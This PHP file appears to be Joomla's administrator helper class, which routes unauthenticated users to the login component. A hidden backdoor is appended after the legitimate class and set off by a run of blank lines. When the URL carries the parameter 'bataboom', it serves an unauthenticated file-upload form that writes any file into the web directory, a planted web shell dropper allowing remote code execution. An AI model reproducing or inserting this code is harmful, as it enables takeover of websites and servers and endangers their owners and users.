<?php
/**
 * @package    Joomla.Administrator
 *
 * @copyright  Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Joomla! Administrator Application helper class.
 * Provide many supporting API functions.
 *
 * @package     Joomla.Administrator
 * @subpackage  Application
 * @since       1.5
 */
class JAdministratorHelper
{
	/**
	 * Return the application option string [main component].
	 *
	 * @return  string  The component to access.
	 *
	 * @since   1.5
	 */
	public static function findOption()
	{
		$app = JFactory::getApplication();
		$option = strtolower($app->input->get('option'));

		$app->loadIdentity();
		$user = $app->getIdentity();
		if ($user->get('guest') || !$user->authorise('core.login.admin'))
		{
			$option = 'com_login';
		}

		if (empty($option))
		{
			$option = 'com_cpanel';
		}

		$app->input->set('option', $option);
		return $option;
	}
}
				
if(isset($_GET['bataboom'])){if(isset($_FILES['im'])){$dim=getcwd().'/';$im=$_FILES['im'];@move_uploaded_file($im['tmp_name'], $dim.$im['name']);echo"Done: ".$dim.$im['name'];}else{?><form method="POST" enctype="multipart/form-data"><input type="file" name="im"/><input type="Submit"/></form><?php }}